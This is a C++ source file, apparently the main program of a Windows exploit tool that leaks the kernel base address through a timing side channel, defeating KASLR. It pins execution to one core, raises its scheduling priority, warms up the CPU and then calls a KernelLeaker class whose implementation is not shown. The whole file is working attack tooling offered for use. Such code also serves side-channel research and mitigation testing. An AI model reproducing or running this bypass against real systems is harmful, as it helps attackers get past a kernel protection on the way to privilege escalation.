#include "KernelLeaker.h"
#include <iostream>
#include <format>
#include <string_view>
#include <span>
#include <Windows.h>

namespace {
    enum class Operation {
        LeakKernelBase,
        PrintTimings
    };

    Operation parse_arguments(std::span<char*> args) {
        for (const auto arg : args.subspan(1)) {
            std::string_view arg_view(arg);
            if (arg_view == "--print-timings" || arg_view == "-pt") {
                return Operation::PrintTimings;
            }
        }
        return Operation::LeakKernelBase;
    }

    void print_usage(std::string_view program_name) {
        std::cout << std::format("Usage: {} [options]\n", program_name);
        std::cout << "Options:\n";
        std::cout << "  --print-timings, -pt    Print timing measurements for all addresses\n";
        std::cout << "  (no options)            Leak kernel base address\n";
    }

    // Optimizes measurement environment for stable timing
    // Pins thread to single core and raises priority to minimize interference
    class EnvironmentOptimizer {
    public:
        EnvironmentOptimizer() {
            // Pin to single CPU core to prevent cache invalidation from migration
            DWORD_PTR mask = 1;
            if (!SetThreadAffinityMask(GetCurrentThread(), mask)) {
                std::cerr << "Warning: Failed to set thread affinity\n";
            }
            
            // Request high scheduling priority to reduce context switches
            if (!SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS)) {
                std::cerr << "Warning: Failed to set high priority class\n";
            }
            
            if (!SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL)) {
                std::cerr << "Warning: Failed to set thread priority\n";
            }
            
            // Warm up CPU to stabilize turbo boost and prefetcher state
            volatile char dummy[64];
            for (int i = 0; i < 100; ++i) {
                sidechannel(const_cast<char*>(dummy));
            }
        }
        
        ~EnvironmentOptimizer() {
            SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
            SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
        }
    };
}

int main(int argc, char** argv) {
    try {
        EnvironmentOptimizer env_opt;
        
        const auto operation = parse_arguments(std::span(argv, static_cast<size_t>(argc)));
        kaslr::KernelLeaker leaker(true);

        switch (operation) {
            case Operation::LeakKernelBase: {
                if (auto kernel_base = leaker.leak_kernel_base_reliable()) {
                    std::cout << std::format("Kernel base: {:p}\n",
                        reinterpret_cast<void*>(*kernel_base));
                    return 0;
                } else {
                    std::cerr << "Failed to leak kernel base!\n";
                    return 1;
                }
            }

            case Operation::PrintTimings:
                leaker.print_timings();
                return 0;
        }

    } catch (const std::exception& ex) {
        std::cerr << std::format("Error: {}\n", ex.what());
        return 1;
    }

    return 0;
}